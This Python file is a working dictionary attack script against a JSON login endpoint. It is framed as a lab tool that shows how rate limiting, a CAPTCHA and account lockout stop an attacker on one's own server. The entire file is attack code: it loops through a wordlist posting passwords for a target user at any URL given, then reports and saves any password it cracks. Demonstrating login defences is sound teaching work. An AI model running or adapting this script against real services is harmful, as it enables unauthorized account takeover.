"""
brute_force.py — A dictionary / brute-force attack script used to TEST the
login server's defences on our own machine (ethical, isolated-lab use only).

It reads a wordlist, then POSTs username + each candidate password to the
server's JSON /login endpoint, imitating an automated attacker. For every
attempt it records the HTTP status and the server's outcome, so the same
script can show two very different stories:

    * against the "BEFORE" server (PROTECT=off): the password is found in
      seconds with no resistance;
    * against the "AFTER"  server (PROTECT=on) : the attacker is throttled
      (429), hit with a CAPTCHA it cannot solve (403) and finally the account
      is locked (423) — the password is never confirmed.

Usage:
    python brute_force.py                      # defaults: admin, wordlist.txt
    python brute_force.py --user admin --wordlist wordlist.txt \
                          --url http://127.0.0.1:5000/login --out run.txt

Note: a deliberately naive attacker — it does NOT attempt to solve the CAPTCHA,
which is exactly why the CAPTCHA control stops it.
"""

import argparse
import os
import sys
import time

import requests

OUTCOME_LABELS = {
    200: "CRACKED",
    401: "wrong password",
    403: "CAPTCHA wall",
    423: "account LOCKED",
    429: "rate limited",
}


def load_wordlist(path):
    with open(path, "r", encoding="utf-8") as fh:
        return [line.strip() for line in fh if line.strip()]


def run_attack(url, username, wordlist, delay, out_path):
    session = requests.Session()
    lines = []

    def emit(text):
        print(text)
        lines.append(text)

    emit("=" * 64)
    emit(f" Dictionary attack on {url}")
    emit(f" Target user : {username}")
    emit(f" Wordlist    : {len(wordlist)} candidate passwords")
    emit("=" * 64)
    emit(f"{'#':>3}  {'password':<16}  {'HTTP':>4}  outcome")
    emit("-" * 64)

    start = time.time()
    cracked_password = None
    counts = {}

    for i, pw in enumerate(wordlist, 1):
        try:
            resp = session.post(
                url,
                json={"username": username, "password": pw},
                headers={"Accept": "application/json"},
                timeout=5,
            )
            status = resp.status_code
        except requests.RequestException as exc:
            emit(f"{i:>3}  {pw:<16}  ----  connection error: {exc}")
            break

        label = OUTCOME_LABELS.get(status, f"status {status}")
        counts[label] = counts.get(label, 0) + 1
        emit(f"{i:>3}  {pw:<16}  {status:>4}  {label}")

        if status == 200:
            cracked_password = pw
            break

        if delay:
            time.sleep(delay)

    elapsed = time.time() - start
    emit("-" * 64)
    emit(f" Attempts made : {i}")
    emit(f" Time taken    : {elapsed:.2f} s")
    emit(" Outcome tally : " + ", ".join(f"{k}={v}" for k, v in counts.items()))
    if cracked_password:
        emit(f" RESULT        : PASSWORD FOUND -> '{cracked_password}'  (login broken)")
    else:
        emit(" RESULT        : password NOT found — defences held")
    emit("=" * 64)

    if out_path:
        os.makedirs(os.path.dirname(os.path.abspath(out_path)), exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
        print(f"\n[saved transcript -> {out_path}]")

    return cracked_password is not None


def main(argv=None):
    here = os.path.dirname(os.path.abspath(__file__))
    ap = argparse.ArgumentParser(description="Dictionary/brute-force login tester")
    ap.add_argument("--url", default="http://127.0.0.1:5000/login")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--wordlist", default=os.path.join(here, "wordlist.txt"))
    ap.add_argument("--delay", type=float, default=0.0,
                    help="seconds to wait between attempts")
    ap.add_argument("--out", default="", help="write the transcript to this file")
    args = ap.parse_args(argv)

    words = load_wordlist(args.wordlist)
    cracked = run_attack(args.url, args.user, words, args.delay, args.out)
    sys.exit(0 if cracked else 2)   # exit 0 if it broke in, 2 if defences held


if __name__ == "__main__":
    main()
